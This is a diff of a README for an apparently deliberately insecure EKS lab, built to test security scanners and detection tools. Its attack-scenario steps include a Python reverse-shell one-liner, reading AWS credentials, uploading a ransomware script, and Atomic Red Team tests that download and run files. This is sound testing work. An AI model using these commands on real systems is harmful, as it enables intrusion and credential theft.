@@ -19,31 +19,33 @@ Test every type of configuration scanner against a single repo that's comically 
 
 ## Deployment:
 
+This will create an EKS cluster with some insecure application pods for testing.
+
 1. Make sure you have Terraform, Helm, AWS CLI, eksctl and a valid AWS user configured
 
-2. `cd terraform`
+2. Move to terraform directory, `cd terraform`
 
-3. `terraform init` `terraform plan` `terraform apply` This creates two EKS node groups, one publicly accessible over SSH and another private. These will run small instances, be sure to `terraform destroy` when you're done for minimal fees. This takes about 15 minutes.
+3. Apply the terraform, this creates an EKS cluster for testing: `terraform init` `terraform plan` `terraform apply` This creates two EKS node groups, one publicly accessible over SSH and another private. These will run small instances, be sure to `terraform destroy` when you're done for minimal fees. This takes about 15 minutes.
 
-4. 
+4. Add the Terraform EKS details to your kubeconfig
 ```
 aws eks --region $(terraform output -raw region) update-kubeconfig \
     --name $(terraform output -raw cluster_name)
 ```
 
-5. Grant your user access to the kubernetes cluster you created - through the Console it's adding the AmazonEKSAdminPolicy and AmazonEKSClusterAdminPolicy to your user. This could be automated with terraform to create a user and a role and output them, but it would require adding additional AWS profiles which I thought might be more confusing unless someone has a better solution.
+5. Grant your user access to the kubernetes cluster you created - through the Console it's adding the AmazonEKSAdminPolicy and AmazonEKSClusterAdminPolicy to your user. This could be automated with terraform to create a user and a role and output them, but it would require adding additional AWS profiles which I thought might be more confusing unless someone has a better solution. 
 
-6. `cd ../insecure-chart/`
+6. Move to the helm chart directory `cd ../insecure-chart/`
 
-7. helm install insecure-app . --create-namespace --namespace=insecure-app
+7. Deploy the insecure app, busybox pod, and workload security evaluator `helm install insecure-app . --create-namespace --namespace=insecure-app`
 
 8. To test in these pods:
 
-Get pod name, `kubectl get pods -n insecure-app` or `kubectl get pods -n workload-security-evaluator`
+Get pod name, `kubectl get pods -n insecure-app` or `kubectl get pods -n insecure-app`
 
 For testing insecure-app, run `kubectl port-forward pod/[POD-NAME] 8080:8080 -n insecure-app`. You can now test in your browser at `http://localhost:8080/`
 
-For workload-security-evaluator, run `k exec -it [POD-NAME] -n workload-security-evaluator -- /bin/bash`, then `pwsh` to being invoking tests such as `Invoke-AtomicTest T1105-27 -ShowDetails`
+For workload-security-evaluator, run `k exec -it [POD-NAME] -n insecure-app -- /bin/bash`, then `pwsh` to being invoking tests such as `Invoke-AtomicTest T1105-27 -ShowDetails`
 
 9. `terraform destroy` when you're done!
 
@@ -89,7 +91,7 @@ For workload-security-evaluator, run `k exec -it [POD-NAME] -n workload-security
     - `export RHOST="WORKLOAD-POD-IP";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
 5. Check what secrets we might have access to `printenv` and `cat ~/.aws/credentials`
 6. Upload ransomware python script `ransomware.py`- this will indicate the level of alerting, if it's new file, python, or specifics about the python
-7. Exec into the workload security evaluator pod with `k exec -it [POD-NAME] -n workload-security-evaluator -- /bin/bash`, then `pwsh`
+7. Exec into the workload security evaluator pod with `k exec -it [POD-NAME] -n insecure-app -- /bin/bash`, then `pwsh`
 8. `Invoke-AtomicTest T1105-27` - download and run a file
 9. `Invoke-AtomicTest T1046-2` - run nmap
 10. `Invoke-AtomicTest T1053.003-2` - modify cron jobs
